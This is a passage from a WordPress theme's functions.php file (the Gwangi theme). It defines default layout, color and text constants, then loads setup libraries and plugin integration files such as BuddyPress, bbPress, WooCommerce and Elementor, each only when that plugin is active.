if ( ! defined( 'GWANGI_404_BUTTON_HOVER_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_HOVER_COLOR', GWANGI_HERO_BUTTON_HOVER_COLOR );
}

if ( ! defined( 'GWANGI_404_BUTTON_HOVER_BORDER_COLOR' ) ) {
	define( 'GWANGI_404_BUTTON_HOVER_BORDER_COLOR', GWANGI_HERO_BUTTON_HOVER_BORDER_COLOR );
}

if ( ! defined( 'GWANGI_404_LAYOUT' ) ) {
	define( 'GWANGI_404_LAYOUT', '6-6-cols-left' );
}

if ( ! defined( 'GWANGI_404_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_404_CONTAINER_LAYOUT', 'fluid' );
}


/**
 * LOADER
 */

if ( ! defined( 'GWANGI_LOADER_COLOR' ) ) {
	define( 'GWANGI_LOADER_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_LOADER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_LOADER_BACKGROUND_COLOR', '#ffffff' );
}


/**
 * BUDDYPRESS
 */

if ( ! defined( 'GWANGI_BUTTON_ACTION_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_BACKGROUND_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_BUTTON_ACTION_LOVE_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_LOVE_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_BUTTON_ACTION_MESSAGE_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_MESSAGE_COLOR', GWANGI_BRAND_INFO );
}

if ( ! defined( 'GWANGI_BUTTON_ACTION_SUCCESS_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_SUCCESS_COLOR', GWANGI_BRAND_SUCCESS );
}

if ( ! defined( 'GWANGI_BUTTON_ACTION_DANGER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_DANGER_COLOR', GWANGI_BRAND_DANGER );
}

if ( ! defined( 'GWANGI_BUTTON_ACTION_MISC_COLOR' ) ) {
	define( 'GWANGI_BUTTON_ACTION_MISC_COLOR', GWANGI_GRAY_DARK );
}


/**
 * THE EVENTS CALENDAR
 */

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_TITLE' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_TITLE', esc_html__( 'Community Events', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_DESCRIPTION' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_DESCRIPTION', esc_html__( 'Take part in our special community events to meet new people or just have fun!', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_DISPLAYED' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_DISPLAYED', true );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_LAYOUT' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_LAYOUT', '6-6-cols-left-reverse' );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_CONTAINER_LAYOUT', 'classic' );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_BACKGROUND_IMAGE' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_BACKGROUND_IMAGE', get_stylesheet_directory_uri() . '/assets/images/pages/header-default-events.jpg' );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_PADDING_Y' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CUSTOM_HEADER_PADDING_Y', GWANGI_HEADER_PADDING_Y );
}

if ( ! defined( 'GWANGI_THE_EVENTS_CALENDAR_CONTENT_PADDING_Y' ) ) {
	define( 'GWANGI_THE_EVENTS_CALENDAR_CONTENT_PADDING_Y', GWANGI_CONTENT_PADDING_Y );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_LAYOUT', '12-cols-left' );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_CONTAINER_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_CONTAINER_LAYOUT', 'classic' );
}


/**
 * BBPRESS
 */

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_TITLE' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_TITLE', esc_html__( 'Welcome to the Forum', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_DESCRIPTION' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_DESCRIPTION', esc_html__( 'Share your thoughts on several topics like lifestyle, social, leisure or simply learn to know each other!', 'gwangi' ) );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_LAYOUT' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_LAYOUT', '9-3-cols-left' );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_BACKGROUND_IMAGE' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_BACKGROUND_IMAGE', get_stylesheet_directory_uri() . '/assets/images/pages/header-default-forum.jpg' );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_PADDING_Y' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_PADDING_Y', GWANGI_HEADER_PADDING_Y );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CONTENT_PADDING_Y' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CONTENT_PADDING_Y', GWANGI_CONTENT_PADDING_Y );
}

if ( ! defined( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_DISPLAYED' ) ) {
	define( 'GWANGI_ARCHIVE_FORUM_CUSTOM_HEADER_DISPLAYED', true );
}


/**
 * BACK TO TOP BTN
 */

if ( ! defined( 'GWANGI_BACK_TO_TOP_BUTTON_BORDER_RADIUS' ) ) {
	define( 'GWANGI_BACK_TO_TOP_BUTTON_BORDER_RADIUS', 10 );
}


/**
 * Require plugins for this theme
 */
require get_template_directory() . '/libs/tgm-plugin-activation/class-tgm-plugin-activation.php';
global $gwangi_tgm_plugin_activation;
$gwangi_tgm_plugin_activation = require get_template_directory() . '/inc/tgm-plugin-activation/class-gwangi-tgm-plugin-activation.php';

/**
 * Load Merlin
 */
require get_template_directory() . '/libs/merlin/vendor/autoload.php';
require get_template_directory() . '/libs/merlin/class-merlin.php';
global $gwangi_merlin;
$gwangi_merlin = require get_template_directory() . '/inc/merlin/class-gwangi-merlin.php';

/**
 * Initialize all the things.
 */
global $gwangi;
$gwangi = require get_template_directory() . '/inc/class-gwangi.php';

/**
 * Custom template hooks and functions for this theme.
 */
require get_template_directory() . '/inc/template-functions.php';
require get_template_directory() . '/inc/template-hooks.php';

/**
 * Plugins integration.
 */
if ( class_exists( 'Kirki' ) ) {
	global $gwangi_kirki;
	$gwangi_kirki = require get_template_directory() . '/inc/kirki/class-gwangi-kirki.php';
}

if ( class_exists( 'Grimlock' ) ) {
	global $gwangi_grimlock;
	$gwangi_grimlock = require get_template_directory() . '/inc/grimlock/class-gwangi-grimlock.php';
	require get_template_directory() . '/inc/grimlock/grimlock-template-functions.php';
	require get_template_directory() . '/inc/grimlock/grimlock-template-hooks.php';
}

if ( class_exists( 'Grimlock_Hero' ) ) {
	global $gwangi_grimlock_hero;
	$gwangi_grimlock_hero = require get_template_directory() . '/inc/grimlock-hero/class-gwangi-grimlock-hero.php';
}

if ( class_exists( 'Grimlock_The_Events_Calendar' ) ) {
	global $gwangi_grimlock_the_events_calendar;
	$gwangi_grimlock_the_events_calendar = require get_template_directory() . '/inc/grimlock-the-events-calendar/class-gwangi-grimlock-the-events-calendar.php';
}

if ( class_exists( 'Jetpack' ) ) {
	global $gwangi_jetpack;
	$gwangi_jetpack = require get_template_directory() . '/inc/jetpack/class-gwangi-jetpack.php';
}

if ( class_exists( 'Grimlock_Jetpack' ) ) {
	global $gwangi_grimlock_jetpack;
	$gwangi_grimlock_jetpack = require get_template_directory() . '/inc/grimlock-jetpack/class-gwangi-grimlock-jetpack.php';
}

if ( function_exists( 'WC' ) ) {
	global $gwangi_woocommerce;
	$gwangi_woocommerce = require get_template_directory() . '/inc/woocommerce/class-gwangi-woocommerce.php';
	require get_template_directory() . '/inc/woocommerce/woocommerce-template-functions.php';
	require get_template_directory() . '/inc/woocommerce/woocommerce-template-hooks.php';
}

if ( class_exists( 'Grimlock_WooCommerce' ) ) {
	global $gwangi_grimlock_woocommerce;
	$gwangi_grimlock_woocommerce = require get_template_directory() . '/inc/grimlock-woocommerce/class-gwangi-grimlock-woocommerce.php';
	require get_template_directory() . '/inc/grimlock-woocommerce/grimlock-woocommerce-template-functions.php';
	require get_template_directory() . '/inc/grimlock-woocommerce/grimlock-woocommerce-template-hooks.php';
}

if ( function_exists( 'wp_pagenavi' ) ) {
	require get_template_directory() . '/inc/wp-pagenavi/wp-pagenavi-template-functions.php';
	require get_template_directory() . '/inc/wp-pagenavi/wp-pagenavi-template-hooks.php';
}

if ( function_exists( 'yoast_breadcrumb' ) ) {
	require get_template_directory() . '/inc/wordpress-seo/wordpress-seo-template-functions.php';
	require get_template_directory() . '/inc/wordpress-seo/wordpress-seo-template-hooks.php';
}

if ( class_exists( 'Grimlock_WordPress_SEO' ) ) {
	global $gwangi_grimlock_wordpress_seo;
	$gwangi_grimlock_wordpress_seo = require get_template_directory() . '/inc/grimlock-wordpress-seo/class-gwangi-grimlock-wordpress-seo.php';
}

if ( class_exists( 'Projects' ) ) {
	require get_template_directory() . '/inc/projects-by-woothemes/projects-by-woothemes-template-functions.php';
	require get_template_directory() . '/inc/projects-by-woothemes/projects-by-woothemes-template-hooks.php';
}

if ( class_exists( 'Menu_Image_Plugin' ) ) {
	global $gwangi_menu_image;
	$gwangi_menu_image = require get_template_directory() . '/inc/menu-image/class-gwangi-menu-image.php';
}

if ( function_exists( 'buddypress' ) ) {

	if ( ! class_exists( 'Youzer' ) ) {
		define( 'BP_AVATAR_THUMB_WIDTH',        280 );
		define( 'BP_AVATAR_THUMB_HEIGHT',       320 );
		define( 'BP_AVATAR_FULL_WIDTH',         350 );
		define( 'BP_AVATAR_FULL_HEIGHT',        400 );
		define( 'BP_AVATAR_ORIGINAL_MAX_WIDTH', 999 );
		define( 'BP_AVATAR_DEFAULT',            get_stylesheet_directory_uri() . '/assets/images/avatars/user-avatar.png' );
		define( 'BP_AVATAR_DEFAULT_THUMB',      get_stylesheet_directory_uri() . '/assets/images/avatars/user-avatar-thumb.png' );
	}

	global $gwangi_buddypress;
	$gwangi_buddypress = require get_template_directory() . '/inc/buddypress/class-gwangi-buddypress.php';
}

if ( class_exists( 'Grimlock_BuddyPress' ) ) {
	global $gwangi_grimlock_buddypress;
	$gwangi_grimlock_buddypress = require get_template_directory() . '/inc/grimlock-buddypress/class-gwangi-grimlock-buddypress.php';
}

if ( function_exists( 'bbpress' ) ) {
	global $gwangi_bbpress;
	$gwangi_bbpress = require get_template_directory() . '/inc/bbpress/class-gwangi-bbpress.php';
	require get_template_directory() . '/inc/grimlock-buddypress/grimlock-buddypress-template-functions.php';
	require get_template_directory() . '/inc/grimlock-buddypress/grimlock-buddypress-template-hooks.php';
}

if ( class_exists( 'Grimlock_bbPress' ) ) {
	global $gwangi_grimlock_bbpress;
	$gwangi_grimlock_bbpress = require get_template_directory() . '/inc/grimlock-bbpress/class-gwangi-grimlock-bbpress.php';
}

if ( function_exists( 'bps_templates' ) ) {
	global $gwangi_bp_profile_search;
	$gwangi_bp_profile_search = require get_template_directory() . '/inc/bp-profile-search/class-gwangi-bp-profile-search.php';
}

if ( class_exists( 'AuthorAvatars' ) ) {
	require get_template_directory() . '/inc/author-avatars/author-avatars-template-functions.php';
	require get_template_directory() . '/inc/author-avatars/author-avatars-template-hooks.php';
}

if ( class_exists( 'Grimlock_Author_Avatars' ) ) {
	global $gwangi_grimlock_author_avatars;
	$gwangi_grimlock_author_avatars = require get_template_directory() . '/inc/grimlock-author-avatars/class-gwangi-grimlock-author-avatars.php';
	require get_template_directory() . '/inc/grimlock-author-avatars/grimlock-author-avatars-template-functions.php';
	require get_template_directory() . '/inc/grimlock-author-avatars/grimlock-author-avatars-template-hooks.php';
}

if ( class_exists( 'YITH_WCWL' ) ) {
	global $gwangi_yith_woocommerce_wishlist;
	$gwangi_yith_woocommerce_wishlist = require get_template_directory() . '/inc/yith-woocommerce-wishlist/class-gwangi-yith-woocommerce-wishlist.php';
}

if ( function_exists( 'SP' ) || class_exists( 'SportsPress_Pro' ) ) {
	global $gwangi_sportspress;
	$gwangi_sportspress = require get_template_directory() . '/inc/sportspress/class-gwangi-sportspress.php';
}

if ( class_exists( 'Grimlock_RevSlider' ) ) {
	global $gwangi_grimlock_revslider;
	$gwangi_grimlock_revslider = require get_template_directory() . '/inc/grimlock-revslider/class-gwangi-grimlock-revslider.php';
}

if ( class_exists( 'Tribe__Events__Main' ) ) {
	global $gwangi_the_events_calendar;
	$gwangi_the_events_calendar = require get_template_directory() . '/inc/the-events-calendar/class-gwangi-the-events-calendar.php';
}

if ( class_exists( 'Grimlock_LearnDash' ) ) {
	global $gwangi_grimlock_learndash;
	$gwangi_grimlock_learndash = require get_template_directory() . '/inc/grimlock-learndash/class-gwangi-grimlock-learndash.php';
}

if ( class_exists( 'Grimlock_Login' ) ) {
	global $gwangi_grimlock_login;
	$gwangi_grimlock_login = require get_template_directory() . '/inc/grimlock-login/class-gwangi-grimlock-login.php';
}

if ( function_exists( 'pmpro_init' ) ) {
	global $gwangi_paid_memberships_pro;
	$gwangi_paid_memberships_pro = require get_template_directory() . '/inc/paid-memberships-pro/class-gwangi-paid-memberships-pro.php';
}

if ( class_exists( 'Elementor\Plugin' ) ) {
	global $gwangi_elementor;
	$gwangi_elementor = require get_template_directory() . '/inc/elementor/class-gwangi-elementor.php';
}

/**
 * Note: Do not add any custom code here. Please use a custom plugin or a child theme
 * so that your customizations aren't lost during updates.
 *
 * @link https://doc.themosaurus.com/creating-child-theme/
 */
